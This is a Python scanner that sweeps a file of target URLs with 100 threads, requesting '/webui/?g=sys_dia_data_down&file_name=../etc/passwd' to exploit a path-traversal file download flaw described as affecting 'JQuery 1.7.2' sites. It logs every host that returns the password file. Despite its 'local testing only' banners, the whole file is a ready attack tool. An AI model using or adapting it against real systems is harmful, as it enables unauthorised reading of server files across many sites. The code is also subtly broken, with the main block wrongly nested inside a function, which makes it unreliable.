# -*- encoding: utf-8 -*-
# Time: 2022/09/22 11:20:58
# Author: crow 


import re
import requests
import threading
from queue import Queue
requests.packages.urllib3.disable_warnings()

def title():
    print('+------------------------------------------')
    print('[+]  \033[34mGithub : https://github.com/crow821/                                \033[0m')
    print('[+]  \033[34m公众号 : 乌鸦安全(crowsec)                                                \033[0m')

    print('[+]  \033[34m功  能: JQuery 1.7.2 版本站点前台任意文件下载漏洞检测                     \033[0m')
    print('[+]  \033[34m注  意:仅供个人本地验证，禁止用于非法用途，请严格遵守网络安全法!!!           \033[0m')
    print('[+]  \033[34m注  意:仅限在本地自行测试，禁止用于非授权测试！！！                    \033[0m')
    print('[+]  \033[34m注  意:仅限在本地自行测试，禁止用于非授权测试！！！                    \033[0m')
    print('[+]  \033[34m注  意:仅限在本地自行测试，禁止用于非授权测试！！！                    \033[0m')
    print('[+]  \033[36m使用格式:  python3 JQuery_download_check.py                        \033[0m')
    print('+------------------------------------------')

title()

class Check_JQuery_vuln(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self._queue = queue


    def run(self):
        while not self._queue.empty():
            Url = self._queue.get()
            print('[+] info 当前还有{}个------------------'.format(self._queue.qsize()))

            try:
                self.check(Url)
            except Exception as e:
                print('此处报错：', e)

    def check(self, Url):
        payload = ["/webui/?g=sys_dia_data_down&file_name=../etc/passwd","/webui/?g=sys_dia_data_down&file_name=/etc/passwd"]
        for i in range(2):
            if 'http' not in Url:
                Url = 'http://' + Url
            check_url = Url + payload[i]
            # print('检查前的url', check_url)
            headers = {
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
            }   
            try:
                res = requests.get(url=check_url, headers=headers, timeout=1,verify=False)
                str1='root'
                if 'root' in res.text:
                    print('[+] info 漏洞确认存在：'+ str.rstrip(check_url))
                    with open('JQuery_vuln.txt', 'a+') as ff:
                        ff.write(check_url + '\n')
                else:
                    # pass
                    print('[-] info {} 不存在漏洞!'.format(Url))
            except Exception as e:
                # pass
                print('[-] info {} 不存在漏洞!'.format(Url))


def check_ip(file_path):
    queue = Queue()
    with open(file_path, 'r') as f:
        for line in f.readlines():
            need_check_url = line.strip()
            queue.put(need_check_url)
        print('[+] Loading complite')
        threads = []
        thread_counts = 100 # 定义线程
        for i in range(thread_counts):
            threads.append(Check_JQuery_vuln(queue))
        for t in threads:
            t.start()
        for t in threads:
            t.join()



        if __name__ == "__main__":  
            print('[+]  \033[36m请输入您的文件路径, 如：check_urls.txt\033[0m')
            file_path = input('[+]  \033[36m待检测文件路径：\033[0m')
            # file_path = 'check_urls.txt'
            check_ip(file_path)
            print('[+]  \033[36m[+] check complete, 漏洞文件保存为 JQuery_vuln.txt\033[0m')
